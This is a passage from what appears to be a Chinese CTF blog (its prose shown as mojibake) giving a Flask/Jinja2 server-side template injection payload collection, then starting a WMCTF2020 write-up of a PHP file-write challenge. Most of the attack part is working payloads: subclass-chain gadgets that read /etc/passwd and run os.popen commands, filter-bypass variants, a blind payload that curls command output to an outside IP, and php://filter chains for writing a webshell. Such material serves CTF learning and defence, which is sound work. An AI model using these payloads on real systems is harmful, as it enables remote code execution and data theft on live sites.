<h1 id="æ„é€ é“¾æ€è·¯"><a href="#æ„é€ é“¾æ€è·¯" class="headerlink" title="æ„é€ é“¾æ€è·¯"></a><strong>æ„é€ é“¾æ€è·¯</strong></h1><p>æ€è·¯å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">&quot;&quot;</span>.__class__)</span><br><span class="line"><span class="comment">#&lt;class &#x27;str&#x27;&gt;</span></span><br></pre></td></tr></table></figure>

<p>å…ˆä½¿ç”¨è¯¥payloadæ¥è·å–æŸä¸ªç±»ï¼Œè¿™é‡Œå¯ä»¥è·å–åˆ°çš„æ˜¯strç±»ï¼Œå®é™…ä¸Šè·å–åˆ°ä»»ä½•ç±»éƒ½å¯ä»¥ï¼Œå› ä¸ºæˆ‘ä»¬éƒ½æœ€ç»ˆç›®çš„æ˜¯è¦è·å–åˆ°åŸºç±»Objectã€‚</p>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬å¯ä»¥é€šè¿‡<strong>bases</strong>æˆ–è€…<strong>mro</strong>æ¥è·å–åˆ°objectåŸºç±»ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>])</span><br><span class="line"><span class="comment">#&lt;class &#x27;object&#x27;&gt;</span></span><br><span class="line">print(<span class="string">&quot;&quot;</span>.__class__.__mro__[<span class="number">1</span>])</span><br><span class="line"><span class="comment">#&lt;class &#x27;object&#x27;&gt;</span></span><br></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥è·å–å…¶æ‰€æœ‰å­ç±»ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">&quot;&quot;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__())</span><br><span class="line">print(<span class="string">&quot;&quot;</span>.__class__.__base__.__subclasses__())</span><br><span class="line">print(<span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__())</span><br><span class="line"><span class="comment">#[&lt;class &#x27;type&#x27;&gt;, &lt;class &#x27;weakref&#x27;&gt;, ... ,&lt;class &#x27;_sitebuiltins._Printer&#x27;&gt;, &lt;class &#x27;_sitebuiltins._Helper&#x27;&gt;]</span></span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬åªéœ€è¦å¯»æ‰¾å¯èƒ½æ‰§è¡Œå‘½ä»¤æˆ–è€…å¯ä»¥è¯»å–æ–‡ä»¶çš„ç±»å°±å¯ä»¥äº†ï¼Œé‡ç‚¹å…³æ³¨os/fileè¿™äº›å…³é”®å­—ã€‚</p>
<h2 id="fileå¯¹è±¡ä»»æ„è¯»å–æ–‡ä»¶"><a href="#fileå¯¹è±¡ä»»æ„è¯»å–æ–‡ä»¶" class="headerlink" title="fileå¯¹è±¡ä»»æ„è¯»å–æ–‡ä»¶"></a><strong>fileå¯¹è±¡ä»»æ„è¯»å–æ–‡ä»¶</strong></h2><ul>
<li>python3ä¸­å·²ç»ç§»é™¤äº†fileï¼Œæ‰€ä»¥è¿™ç§æ–¹æ³•åªèƒ½åœ¨python2ä¸­ä½¿ç”¨</li>
</ul>
<p>fileæ˜¯åœ¨å­ç±»åˆ—è¡¨çš„ç¬¬41ä¸ª</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(().__class__.__base__.__subclasses__()[<span class="number">40</span>])</span><br><span class="line"><span class="comment">#&lt;type &#x27;file&#x27;&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨diræŸ¥çœ‹fileå¯¹è±¡ä¸­çš„å†…ç½®æ–¹æ³•</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(dir(().__class__.__base__.__subclasses__()[<span class="number">40</span>]))</span><br><span class="line"><span class="comment">#[&#x27;__class__&#x27;, &#x27;__delattr__&#x27;, &#x27;__doc__&#x27;, &#x27;__enter__&#x27;, &#x27;__exit__&#x27;, &#x27;__format__&#x27;, &#x27;__getattribute__&#x27;, &#x27;__hash__&#x27;, &#x27;__init__&#x27;, &#x27;__iter__&#x27;, &#x27;__new__&#x27;, &#x27;__reduce__&#x27;, &#x27;__reduce_ex__&#x27;, &#x27;__repr__&#x27;, &#x27;__setattr__&#x27;, &#x27;__sizeof__&#x27;, &#x27;__str__&#x27;, &#x27;__subclasshook__&#x27;, &#x27;close&#x27;, &#x27;closed&#x27;, &#x27;encoding&#x27;, &#x27;errors&#x27;, &#x27;fileno&#x27;, &#x27;flush&#x27;, &#x27;isatty&#x27;, &#x27;mode&#x27;, &#x27;name&#x27;, &#x27;newlines&#x27;, &#x27;next&#x27;, &#x27;read&#x27;, &#x27;readinto&#x27;, &#x27;readline&#x27;, &#x27;readlines&#x27;, &#x27;seek&#x27;, &#x27;softspace&#x27;, &#x27;tell&#x27;, &#x27;truncate&#x27;, &#x27;write&#x27;, &#x27;writelines&#x27;, &#x27;xreadlines&#x27;]</span></span><br></pre></td></tr></table></figure>

<p>ç›´æ¥è°ƒç”¨é‡Œé¢çš„æ–¹æ³•è¿›è¡Œè¯»å–æ–‡ä»¶</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).readlines())</span><br></pre></td></tr></table></figure>

<h2 id="å†…ç½®æ¨¡å—æ‰§è¡Œä»»æ„å‘½ä»¤"><a href="#å†…ç½®æ¨¡å—æ‰§è¡Œä»»æ„å‘½ä»¤" class="headerlink" title="å†…ç½®æ¨¡å—æ‰§è¡Œä»»æ„å‘½ä»¤"></a><strong>å†…ç½®æ¨¡å—æ‰§è¡Œä»»æ„å‘½ä»¤</strong></h2><blockquote>


- è¯¥æ–¹æ³•ä¹Ÿåªèƒ½åœ¨python2ä¸­ä½¿ç”¨

æˆ‘ä»¬çŸ¥é“`__globals__`èƒ½å¤Ÿè¿”å›å½“å‰å¼•ç”¨çš„æ‰€æœ‰æ¨¡å—å’Œå˜é‡ï¼Œå¦‚æœæŸä¸ªç±»å¼•ç”¨äº†OSæ¨¡å—é‚£å°±å¯èƒ½èƒ½å¤Ÿæ‰§è¡Œå‘½ä»¤ã€‚

è¿™é‡Œæœ‰ä¸€ä¸ªè„šæœ¬ï¼Œå…ˆéå†æ‰€æœ‰å­ç±»ï¼Œç„¶åéå†å­ç±»çš„æ–¹æ³•çš„æ‰€å¼•ç”¨çš„ä¸œè¥¿çš„keyä¹Ÿå°±æ˜¯é”®åï¼Œæ¥æœç´¢æ˜¯å¦è°ƒç”¨äº†osã€‚

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line">search = <span class="string">&#x27;os&#x27;</span>   <span class="comment">#ä¹Ÿå¯ä»¥æ˜¯å…¶ä»–ä½ æƒ³åˆ©ç”¨çš„æ¨¡å—</span></span><br><span class="line">num = <span class="number">-1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__():</span><br><span class="line">    num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> search <span class="keyword">in</span> i.__init__.__globals__.keys():</span><br><span class="line">            print(i, num)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">(&lt;class &#x27;site._Printer&#x27;&gt;, 69)</span></span><br><span class="line"><span class="string">(&lt;class &#x27;site.Quitter&#x27;&gt;, 74)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

ç„¶åç›´æ¥ä½¿ç”¨

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(().__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">69</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;dir&#x27;</span>))</span><br><span class="line">print(().__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">74</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;dir&#x27;</span>))</span><br></pre></td></tr></table></figure>

å¦‚æœæ˜¯ä¸Šé¢flaskçš„ä¾‹å­

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">375</span>].__init__.__globals__[<span class="string">&quot;os&quot;</span>][<span class="string">&quot;popen&quot;</span>](<span class="string">&quot;whoami&quot;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

ç›´æ¥å»çˆ†ç ´375è¿™ä¸ªæ•°ä¹Ÿå¯ä»¥ã€‚

> 
</blockquote>
<h2 id="builtins-ä»£ç æ‰§è¡Œ"><a href="#builtins-ä»£ç æ‰§è¡Œ" class="headerlink" title="__builtins__ä»£ç æ‰§è¡Œ"></a><strong><code>__builtins__</code>ä»£ç æ‰§è¡Œ</strong></h2>

è¿™ç§çš„è¯ï¼Œpython2ï¼Œ3éƒ½å¯ä»¥ä½¿ç”¨ã€‚

æ€è·¯å¦‚ä¸‹ï¼š

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(dir(__builtins__))</span><br></pre></td></tr></table></figure>

åŒæ ·æŸ¥æ‰¾globalsä¸­å«æœ‰çš„`__builtins__`

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">search = <span class="string">&#x27;__builtins__&#x27;</span></span><br><span class="line">num = <span class="number">-1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__():</span><br><span class="line">    num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> search <span class="keyword">in</span> i.__init__.__globals__.keys():</span><br><span class="line">            print(i, num)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

payload

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">75</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;dir&#x27;)&quot;</span>))</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">65</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;pen&#x27;</span>](<span class="string">&#x27;/flag&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

> 

<h1 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a><strong>Bypass</strong></h1><blockquote>


å½“æˆ‘ä»¬éœ€è¦æµ‹è¯•SSTIè¿‡æ»¤äº†ä»€ä¹ˆçš„æ—¶å€™ï¼Œå¯ä»¥ä½¿ç”¨å¦‚ä¸‹payloadé˜²æ­¢å…¶500:

`{{"è¦æµ‹è¯•çš„å­—ç¬¦"}}`ï¼Œåªéœ€è¦çœ‹çœ‹è¦æµ‹è¯•çš„å­—ç¬¦æ˜¯å¦è¿”å›åœ¨é¡µé¢ä¸­å³å¯ï¼Œä¸‹é¢åˆ†åˆ«è¯´è¯´å¯¹åº”å„ç§è¿‡æ»¤æƒ…å†µçš„è§£å†³åŠæ³•ã€‚


</blockquote>
<h2 id="è¿‡æ»¤å¼•å·"><a href="#è¿‡æ»¤å¼•å·" class="headerlink" title="è¿‡æ»¤å¼•å·"></a><strong>è¿‡æ»¤å¼•å·</strong></h2>

å›é¡¾ä¸Šé¢çš„payload

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">375</span>].__init__.__globals__[<span class="string">&quot;os&quot;</span>][<span class="string">&quot;popen&quot;</span>](<span class="string">&quot;whoami&quot;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

å‰é¢çš„å¼•å·æ˜¯ä¸ºäº†å¼•å‡ºåŸºç±»ï¼Œå¯ä»¥è¢«æ›¿æ¢ä¸ºæ•°ç»„ã€å­—å…¸ï¼Œä»¥åŠæ•°å­—ã€‚

åé¢çš„å¼•å·å¯ä»¥ä½¿ç”¨request.argsæ¥ç»•è¿‡æ­¤å¤„çš„è¿‡æ»¤ã€‚

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">375</span>].__init__.__globals__[request.args.arg1][request.args.arg2](request.args.arg3).read()&#125;&#125;&amp;arg1=os&amp;arg2=popen&amp;arg3=whoami</span><br></pre></td></tr></table></figure>

å¦å¤–çš„ä¸€ç§æ–¹æ³•

é€šè¿‡pythonè‡ªå¸¦å‡½æ•°æ¥ç»•è¿‡å¼•å·ï¼Œè¿™é‡Œä½¿ç”¨çš„æ˜¯chr()ã€‚

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[Â§<span class="number">0</span>Â§].__init__.__globals__.__builtins__.chr&#125;&#125;</span><br></pre></td></tr></table></figure>

é€šè¿‡payloadçˆ†ç ´subclassesï¼Œè·å–æŸä¸ªsubclassesä¸­å«æœ‰chrçš„ç±»ç´¢å¼•ï¼Œå¯ä»¥çœ‹åˆ°çˆ†ç ´å‡ºæ¥å¾ˆå¤šäº†ï¼Œè¿™é‡Œéšä¾¿é€‰ä¸€ä¸ªã€‚

æ¥ç€å°è¯•ä½¿ç”¨chrå°è¯•ç»•è¿‡åç»­æ‰€æœ‰çš„å¼•å·ï¼š

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%set+chr=[].__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">77</span>].__init__.__globals__.__builtins__.chr%&#125;&#123;&#123;[].__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">375</span>].__init__.__globals__[chr(<span class="number">111</span>)%<span class="number">2</span>bchr(<span class="number">115</span>)][chr(<span class="number">112</span>)%<span class="number">2</span>bchr(<span class="number">111</span>)%<span class="number">2</span>bchr(<span class="number">112</span>)%<span class="number">2</span>bchr(<span class="number">101</span>)%<span class="number">2</span>bchr(<span class="number">110</span>)](chr(<span class="number">100</span>)%<span class="number">2</span>bchr(<span class="number">105</span>)%<span class="number">2</span>bchr(<span class="number">114</span>)).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

## **è¿‡æ»¤ä¸­æ‹¬å·**

å›é¡¾æœ€åˆçš„payload

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">375</span>].__init__.__globals__[<span class="string">&quot;os&quot;</span>][<span class="string">&quot;popen&quot;</span>](<span class="string">&quot;whoami&quot;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

è¿™é‡Œglobalsçš„ä¸­æ‹¬å·æœ‰ç‚¹é—®é¢˜ã€‚

a[0]ä¸a.**getitem**(0)çš„æ•ˆæœæ˜¯ä¸€æ ·çš„ï¼Œæ‰€ä»¥ä¸Šè¿°payloadå¯ä»¥ç”¨æ­¤æ¥ç»•è¿‡ï¼š

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__mro__.__getitem__(<span class="number">1</span>).__subclasses__().__getitem__(<span class="number">375</span>).__init__.__globals__[<span class="string">&quot;os&quot;</span>][<span class="string">&quot;popen&quot;</span>](<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

## **è¿‡æ»¤å…³é”®å­—**

ä¸»è¦çœ‹å…³é”®å­—æ˜¯å¦‚ä½•è¿‡æ»¤çš„ï¼Œå¦‚æœåªæ˜¯æ›¿æ¢ä¸ºç©ºï¼Œå¯ä»¥å°è¯•åŒå†™ç»•è¿‡ï¼Œå¦‚æœç›´æ¥banäº†ï¼Œå°±å¯ä»¥ä½¿ç”¨å­—ç¬¦ä¸²åˆå¹¶çš„æ–¹å¼è¿›è¡Œç»•è¿‡ã€‚

ä½¿ç”¨ä¸­æ‹¬å·çš„payloadï¼š

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>[<span class="string">&quot;__cla&quot;</span>+<span class="string">&quot;ss__&quot;</span>]&#125;&#125;</span><br></pre></td></tr></table></figure>

ä¸ä½¿ç”¨ä¸­æ‹¬å·çš„payloadï¼š

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__getattribute__(<span class="string">&quot;__cla&quot;</span>+<span class="string">&quot;ss__&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>

è¿™é‡Œä¸»è¦ä½¿ç”¨äº†**getattribute**æ¥è·å–å­—å…¸ä¸­çš„valueï¼Œå‚æ•°ä¸ºkeyå€¼ã€‚

ç¬¬äºŒç§ç»•è¿‡è¿‡æ»¤å…³é”®å­—çš„åŠæ³•ä¹‹å‰ä¹Ÿæåˆ°äº†ï¼Œå³ä½¿ç”¨requestå¯¹è±¡ï¼š

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;&quot;</span>.__getattribute__(request.args.a)&#125;&#125;&amp;a=__class__</span><br></pre></td></tr></table></figure>

ç¬¬ä¸‰ç§ç»•è¿‡å…³é”®å­—è¿‡æ»¤çš„åŠæ³•å³ä½¿ç”¨stråŸç”Ÿå‡½æ•°ï¼š

æˆ‘ä»¬å¯ä»¥ä½¿ç”¨decodeã€replaceç­‰æ¥ç»•è¿‡æ‰€è¿‡æ»¤çš„å…³é”®å­—ã€‚

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;YWE=&quot;</span>.replace(<span class="string">&quot;W&quot;</span>,<span class="string">&quot;&quot;</span>)&#125;&#125;</span><br><span class="line"><span class="comment">#YE=</span></span><br><span class="line">&#123;&#123;<span class="string">&quot;YWE=&quot;</span>.decode(<span class="string">&quot;base64&quot;</span>)&#125;&#125;</span><br><span class="line"><span class="comment">#aa</span></span><br></pre></td></tr></table></figure>

## **æ¨¡å—é˜‰å‰²**

åœ¨æ¯”èµ›ç¯å¢ƒä¸­ï¼Œç»å¸¸ä¼šé˜‰å‰²æ‰ä¸€äº›å†…ç½®å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•ä½¿ç”¨reloadæ¥é‡è½½ã€‚

åœ¨Python2ä¸­ï¼Œreloadæ˜¯å†…ç½®å‡½æ•°ï¼Œè€Œåœ¨Python3ä¸­ï¼Œreloadåˆ™ä¸ºimp moduleä¸‹çš„å‡½æ•°ï¼Œä½¿ç”¨æ–¹æ³•ï¼š

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> imp <span class="keyword">import</span> reload</span><br><span class="line">reload(a).popen(<span class="string">&quot;whoami&quot;</span>).read()</span><br></pre></td></tr></table></figure>

æˆ‘ä»¬ä¸€èˆ¬æ˜¯ä¸èƒ½ç›´æ¥reload(os)çš„ï¼Œå› ä¸ºå¯èƒ½å½“å‰ç±»å¹¶æ²¡æœ‰import osã€‚

æ‰€ä»¥ä¸€èˆ¬éƒ½æ˜¯`reload(__builtins__)`ï¼Œè¿™æ—¶å¯ä»¥é‡æ–°è½½å…¥**builtins**ï¼Œæ­¤æ—¶**builtins**ä¸­è¢«åˆ é™¤çš„æ¯”å¦‚evalã€**import**ç­‰å°±åˆéƒ½å›æ¥äº†ã€‚

## **è¿‡æ»¤{{}}**

ç›¸å½“äºæŠŠå‘½ä»¤æ‰§è¡Œçš„ç»“æœå¤–å¸¦å‡ºå»ã€‚

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">if</span> <span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.linecache.os.popen(<span class="string">&#x27;curl http://xx.xxx.xx.xx:8080/?i=`whoami`&#x27;</span>).read()==<span class="string">&#x27;p&#x27;</span> %&#125;<span class="number">1</span>&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>

## **è¿‡æ»¤ç‚¹å·**

åœ¨Pythonç¯å¢ƒä¸­(Python2/Python3)ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è®¿é—®å­—å…¸çš„æ–¹å¼æ¥è®¿é—®å‡½æ•°/ç±»ç­‰ã€‚

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>.__class__ç­‰ä»·äº<span class="string">&quot;&quot;</span>[<span class="string">&quot;__class__&quot;</span>]</span><br></pre></td></tr></table></figure>

> 
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://www.getflag.cn/2020/08/06/WMCTF2020/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="http://yuhaojiang.gitee.io/picture/Blogå¤´åƒ.jpg">
      <meta itemprop="name" content="kawhi">
      <meta itemprop="description" content="æ²¡æœ‰æ³¢æ¶›ï¼Œå¦‚ä½•æ±¹æ¶Œ">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="kawhi">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/08/06/WMCTF2020/" class="post-title-link" itemprop="url">WMCTF2020</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2020-08-06 00:00:00" itemprop="dateCreated datePublished" datetime="2020-08-06T00:00:00+08:00">2020-08-06</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2020-10-16 11:52:45" itemprop="dateModified" datetime="2020-10-16T11:52:45+08:00">2020-10-16</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF%E6%AF%94%E8%B5%9B/" itemprop="url" rel="index"><span itemprop="name">CTFæ¯”èµ›</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a><strong>å‰è¨€</strong></h1><p>ä¸ä¼šåšï¼Œå¥½å¤šçŸ¥è¯†ç›²ç‚¹ğŸ™ƒ</p>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a><strong>web</strong></h1><h2 id="web-checkin"><a href="#web-checkin" class="headerlink" title="web_checkin"></a><strong>web_checkin</strong></h2><p>æºç ä¸º</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//PHP 7.0.33 Apache/2.4.25</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$sandbox = <span class="string">&#x27;/var/www/html/&#x27;</span> . md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">@mkdir($sandbox);</span><br><span class="line">@chdir($sandbox);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;content&#x27;</span>])) &#123;</span><br><span class="line">    $content = $_GET[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/iconv|UCS|UTF|rot|quoted|base64/i&#x27;</span>,$content))</span><br><span class="line">         <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(file_exists($content))</span><br><span class="line">        <span class="keyword">require_once</span>($content);</span><br><span class="line">    file_put_contents($content,<span class="string">&#x27;&lt;?php exit();&#x27;</span>.$content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå¯ä»¥å…ˆå­¦ä¹ Pç¥çš„æ­»äº¡exitçš„ç»•è¿‡ï¼š<a class="foo" target="_blank" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">è°ˆä¸€è°ˆphp://filterçš„å¦™ç”¨</a></p>
<p>è¿™é‡Œçš„è¯çœ‹åˆ°<code>file_put_contents()</code>ä¸€èˆ¬å°±æ˜¯å†™shelläº†ï¼Œä½†æ˜¯å› ä¸ºå‰é¢æœ‰<code>exit()</code>å¯¼è‡´å³ä½¿æˆ‘ä»¬æˆåŠŸå†™å…¥ä¸€å¥è¯ï¼Œä¹Ÿæ‰§è¡Œä¸äº†ï¼Œä¸€èˆ¬æ¥è¯´å¯ä»¥ç”¨base64å¯ä»¥ç›´æ¥ç»•è¿‡ï¼Œå¦‚ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/write=convert.base64-decode/resource=shell.php</span><br></pre></td></tr></table></figure>

<p>æˆ–è€…</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php</span><br></pre></td></tr></table></figure>

<p>å…ˆ<code>strip_tags</code>å»é™¤æ­»äº¡<code>exit</code>ï¼Œå†å°†<code>webshell</code>ç”¨<code>base64-decode</code>è¿˜åŸ</p>
<p>åˆæˆ–è€…</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/write=string.rot13/resource=shell.php</span><br></pre></td></tr></table></figure>

<p>åŸç†å’Œä¸Šé¢ç±»ä¼¼ï¼Œæ ¸å¿ƒæ˜¯å°†â€æ­»äº¡exitâ€å»é™¤ã€‚<code>&lt;?php exit; ?&gt;</code>åœ¨ç»è¿‡rot13ç¼–ç åä¼šå˜æˆ<code>&lt;?cuc rkvg; ?&gt;</code>ï¼Œ</p>
